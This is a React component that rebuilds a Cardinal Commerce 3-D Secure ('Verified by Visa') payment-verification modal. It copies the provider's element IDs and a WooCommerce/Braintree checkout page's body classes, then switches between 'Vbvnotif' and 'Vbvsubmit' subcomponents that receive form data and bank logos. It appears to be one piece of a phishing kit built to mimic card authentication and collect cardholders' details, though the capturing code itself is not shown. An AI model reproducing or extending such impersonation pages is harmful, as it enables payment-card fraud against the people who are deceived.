import React, { useState, useEffect } from 'react';
import Vbvnotif from './vbvnotif';
import Vbvsubmit from './vbvsubmit';

const Container = () => {
  const [styles, setStyles] = useState(null);
  const [showNotif, setShowNotif] = useState(true);
  const [logoUrl, setLogoUrl] = useState('');
  const [brandLogo, setBrandLogo] = useState('');
  const [links, setLinks] = useState({});

  const handleContinue = (logoUrl, brandLogo, links) => {
    setLogoUrl(logoUrl);
    setBrandLogo(brandLogo);
    setLinks(links);
    setShowNotif(false);
  };

  const [formData, setFormData] = useState({
    // Add any form fields that need value props
  });

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData((prev) => ({
      ...prev,
      [name]: value,
    }));
  };

  useEffect(() => {
    const loadStyles = async () => {
      try {
        const [loginStyles, additionalStyles] = await Promise.all([
          import('../../assets/styles/container.css'),
          import('../../assets/styles/3ds.css'),
        ]);

        setStyles({
          login: loginStyles.default,
          additional: additionalStyles.default,
        });
      } catch (error) {
        console.error('Error loading styles:', error);
      }
    };

    loadStyles();
  }, []);

  return (
    <body className="page-template page-template-page-templates page-template-minimal-footer page-template-page-templatesminimal-footer-php page page-id-61 logged-in wp-custom-logo theme-underscores wc-braintree-body woocommerce-checkout woocommerce-page woocommerce-js no-sidebar webp-support">
      <div id="Cardinal-ElementContainer">
        <div id="Cardinal-Modal" style={{paddingTop: '0px'}} className="cardinalOverlay-content shadow-effect cardinalOverlay-open fade-and-drop ">
          <div id="Cardinal-ModalContent" className="size-02" tabIndex="-1">
            {showNotif ? (
              <Vbvnotif formData={formData} onChange={handleChange} onContinue={handleContinue} />
            ) : (
              <Vbvsubmit formData={formData} onChange={handleChange} logoUrl={logoUrl} brandLogo={brandLogo} links={links} />
            )}
          </div>
        </div>
        <div id="Cardinal-Overlay" className="cardinalOverlay-mask cardinalOverlay-open "></div>
      </div>
    </body>
  );
};

export default Container;
